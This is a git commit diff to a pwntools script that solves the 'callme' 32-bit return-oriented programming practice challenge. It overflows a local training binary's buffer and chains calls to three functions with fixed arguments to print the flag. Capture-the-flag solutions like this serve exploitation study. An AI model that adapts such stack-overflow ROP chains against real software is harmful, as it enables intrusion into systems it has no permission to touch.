1f2fea1a7558e77816744d16241598d6b8c2542b
Joel Estibeiro <joelestibeiro7@gmail.com>
2019-06-06 14:10:38 +0530

    Edited callme32.py to a simpler exploit

--- callme/callme32.py
+++ callme/callme32.py
@@ -9,59 +9,30 @@ usefulFunction = 0x8048820
 pop3ret = 0x080488a9
 
 p = process('./callme32')
-# exploit = ''
-# exploit += 'A'*44
-# exploit += p32(callme_one)
-# exploit += p32(main)
-# exploit += p32(1)
-# exploit += p32(2)
-# exploit += p32(3)
-# p.recvuntil('>')
-# p.sendline(exploit)
-
-# exploit = ''
-# exploit += 'A'*44
-# exploit += p32(callme_two)
-# exploit += p32(main)
-# exploit += p32(1)
-# exploit += p32(2)
-# exploit += p32(3)
-# p.recvuntil('>')
-# p.sendline(exploit)
-
-# exploit = ''
-# exploit += 'A'*44
-# exploit += p32(callme_three)
-# exploit += p32(main)
-# exploit += p32(1)
-# exploit += p32(2)
-# exploit += p32(3)
-# p.recvuntil('>')
-# p.sendline(exploit)
-# print p.recvuntil('}')
 
 exploit = ''
 exploit += 'A'*44
-exploit += p64(callme_one)
-exploit += p64(pop3ret)
-exploit += p64(0x1)
-exploit += p64(0x2)
-exploit += p64(0x3)
+exploit += p32(callme_one)
+exploit += p32(pop3ret)
+exploit += p32(0x1)
+exploit += p32(0x2)
+exploit += p32(0x3)
 
-exploit += p64(callme_two)
-exploit += p64(pop3ret)
-exploit += p64(0x1)
-exploit += p64(0x2)
-exploit += p64(0x3)
+exploit += p32(callme_two)
+exploit += p32(pop3ret)
+exploit += p32(0x1)
+exploit += p32(0x2)
+exploit += p32(0x3)
 
-exploit += p64(callme_three)
+exploit += p32(callme_three)
 exploit += 'aaaa'
-exploit += p64(0x1)
-exploit += p64(0x2)
-exploit += p64(0x3)
+exploit += p32(0x1)
+exploit += p32(0x2)
+exploit += p32(0x3)
 
 p.recvuntil('>')
 p.sendline(exploit)
 print p.recvuntil('}')
+
 
 
